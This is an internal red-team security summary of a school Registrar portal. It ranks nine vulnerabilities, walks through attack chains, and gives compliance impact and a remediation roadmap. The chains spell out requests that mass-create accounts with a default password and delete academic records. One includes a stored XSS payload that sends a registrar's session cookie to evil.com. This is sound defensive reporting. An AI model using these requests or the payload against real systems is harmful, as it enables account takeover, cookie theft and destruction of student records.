# Registrar Portal — Executive Security Summary
**Date:** June 6, 2026  
**Classification:** Internal — Restricted  
**Module:** Registrar / Registrar V2  
**Reviewer:** Internal Red Team

---

## Executive Overview

The Registrar portal manages the most academically sensitive data in the system: student enrollment records, academic transcripts (SF10), grade reporting, and the school's entire academic configuration (school years, grading systems, curricula, college programs). A compromise of this module affects every student's academic record and the integrity of the institution's reporting to DepEd and CHED.

The review identified **9 security findings** (2 CRITICAL, 3 HIGH, 2 MEDIUM, 2 LOW) and **4 backend bugs**. Two of the critical findings require zero authentication and can be exploited by anyone on the internet. One high-severity finding allows any logged-in user — including students — to delete the school's entire academic program configuration.

**Overall Risk Rating: CRITICAL**

---

## Risk Summary Table

| ID | Severity | CVSS | Title | Auth Required |
|---|---|---|---|---|
| R-01 | **CRITICAL** | 9.8 | Unauthenticated Mass Account Creation | None |
| R-02 | **CRITICAL** | 8.6 | Unauthenticated Student Database Dump | None |
| R-03 | **HIGH** | 7.5 | Unauthenticated Enrollment Manipulation | None |
| R-04 | **HIGH** | 8.1 | RegistrarV2 Full Module — No Role Check | Login only |
| R-05 | **HIGH** | 8.7 | Stored XSS via Student Name in Search | Login → isRegistrar (victim) |
| R-06 | MEDIUM | 6.5 | Public Pre-Registration — No Rate Limit | None |
| R-07 | MEDIUM | 4.9 | Debug Endpoint with Hardcoded Student Data | isRegistrar |
| R-08 | LOW | — | Triple-Duplicate Route Registration | N/A |
| R-09 | LOW | — | Dead Routes (Methods Missing in Controller) | N/A |

---

## Critical Attack Chains

### Chain A — Anonymous to Student Account Takeover (R-01 + R-02)

**Threat actor:** External attacker with no credentials  
**Impact:** Full student account access for every student in the database  
**Complexity:** Low (two HTTP requests)

```
Step 1:  GET /studentUserDebugger
         → Attacker receives full list of all student IDs (sid), names, user IDs
         → No login required

Step 2:  GET /fixAccountConflict
         → For every student without a user account, a new account is created
         → All created accounts have password = "123456"
         → Account email format: S<sid> (student) or P<sid> (parent)

Step 3:  POST /login  { email: "S1234", password: "123456" }
         → Attacker is now authenticated as student ID 1234
         → Has full access to Student portal: grades, billing, class schedule, pre-enrollment
```

This chain produces **valid login accounts with known credentials** for any student who previously lacked a system account. Because the `fixAccountConflict` endpoint is idempotent, calling it again does not help the defender — accounts are already created. The only remediation is to immediately disable the endpoint and force password resets.

---

### Chain B — Authenticated User Destroys Academic Configuration (R-04)

**Threat actor:** Any student, teacher, parent, or cashier with a valid login  
**Impact:** Deletion of school's academic programs, curricula, grading systems  
**Complexity:** Low (standard session cookie from any authenticated portal)

```
Step 1:  Log in as a student (or any authenticated user)

Step 2:  DELETE /registrarv2/setup/higher-education/colleges/1
         → College ID 1 is deleted from the database
         → All associated courses, sections, and student enrollments cascade or orphan

Step 3:  POST /registrarv2/grading-setup/delete  { id: 1 }
         → Grading setup record deleted — teachers can no longer encode grades for affected sections

Step 4:  DELETE /registrarv2/setup/higher-education/prospectus/{id}/delete
         → Subject removed from curriculum prospectus
```

A student who discovers this vulnerability can delete the entire college setup. Recovery requires restoring from database backups. The RegistrarV2 module has **no `isRegistrar` middleware** — the oversight likely occurred when the module was added and the RouteServiceProvider entry was not given the full middleware stack.

---

### Chain C — Stored XSS to Registrar Account Takeover (R-05)

**Threat actor:** Anyone who can submit a pre-registration (unauthenticated)  
**Victim:** Registrar staff member performing a student search  
**Impact:** Registrar session cookie theft → full registrar portal access  
**Complexity:** Medium

```
Step 1:  GET /prereg/newstudent
         → Public pre-registration form (no auth)
         
Step 2:  Submit form with firstname = '<script>document.location="https://evil.com?c="+document.cookie</script>'
         → Record stored in preregistration table with malicious name

Step 3:  Registrar opens the student search page and searches for pending pre-registrations
         → studentsearch() concatenates $s->firstname directly into HTML
         → XSS payload executes in registrar's browser
         
Step 4:  Registrar's laravel_session cookie forwarded to attacker
         → Attacker replays cookie to impersonate the registrar
```

---

### Chain D — Enrollment Queue Manipulation (R-03)

**Threat actor:** Any student or external user  
**Impact:** False enrollment records, priority queue manipulation  
**Complexity:** Low

```
Step 1:  Obtain a target student's ID (from public roster, enrollment forms, etc.)

Step 2:  GET /pre/enrollment/submit?studid=<target_id>
         → target_id's preEnrolled flag set to 1 in studinfo table
         → Registrar sees this student as "pre-enrolled" (they are not)

Step 3:  GET /early/enrollment/submit?studid=<target_id>&syid=1&semid=1&levelid=7
         → Creates an earlybirds record for the student at Grade 11 (levelid=7)
         → Registrar processing queue now includes fraudulent early enrollment
```

Used maliciously: a registrar staff who processes enrollment sequentially might approve incorrect placements.

---

## Compliance Impact

| Standard | Impact |
|---|---|
| **DepEd Data Privacy Act (R.A. 10173)** | R-01/R-02 expose student PII (name, ID, status) to unauthenticated visitors — violation of data subject rights |
| **CHED Memorandum Orders** | R-04 allows any user to destroy higher education program configurations — academic integrity risk |
| **Institutional Security Policy** | Debug endpoints (R-01, R-02, R-07) in production violate change management and deployment controls |
| **ISO/IEC 27001 A.9.4** | R-04 violates role-based access control principles — insufficient access restrictions on privileged functions |

---

## Affected Components

| Component | Status |
|---|---|
| `DebuggerController.php` | High risk — production debug code, remove entirely |
| `PreRegistrationControllerV2.php` | Unauthenticated write endpoints must be gated |
| `routes/registrarv2.php` | Entire module needs `isRegistrar` middleware added to RouteServiceProvider |
| `RegistrarFunctionController.php` | Output escaping required across all HTML-concatenating methods |
| `PreRegistrationController.php` | Commented-out logic creates behavioral anomalies |
| `RegistrarFormsController.php` | Debug SF10 endpoint should be removed or disabled |

---

## Remediation Roadmap

### P0 — Remediate Immediately (This Sprint)
1. **Remove or fully gate `GET /fixAccountConflict` and `GET /studentUserDebugger`** — these two endpoints are production-exposed debug tools. There is no legitimate use case for unauthenticated access. Add `['auth', 'isSuperAdmin']` or remove entirely.
2. **Add `isRegistrar` middleware to RegistrarV2 RouteServiceProvider entry** — one-line fix in `app/Providers/RouteServiceProvider.php`

### P1 — Remediate Within 1 Week
3. **Add auth middleware to `/early/enrollment/submit` and `/pre/enrollment/submit`**
4. **Add rate limiting to prereg routes** — `throttle:5,1` minimum
5. **Escape all `RegistrarFunctionController` HTML output** with `htmlspecialchars()`

### P2 — Remediate Within 1 Month
6. Remove `GET /registrar/insert/students/sf10` from production
7. Fix `studentsearch()` query to JOIN sections table
8. Replace `echo json_encode()` with `return response()->json()`
9. Clean up duplicate route registrations

---

## Finding Count by Severity

| Severity | Count |
|---|---|
| Critical | 2 |
| High | 3 |
| Medium | 2 |
| Low | 2 |
| Bugs | 4 |
| **Total** | **13** |

---

*End of Registrar Portal Executive Summary*
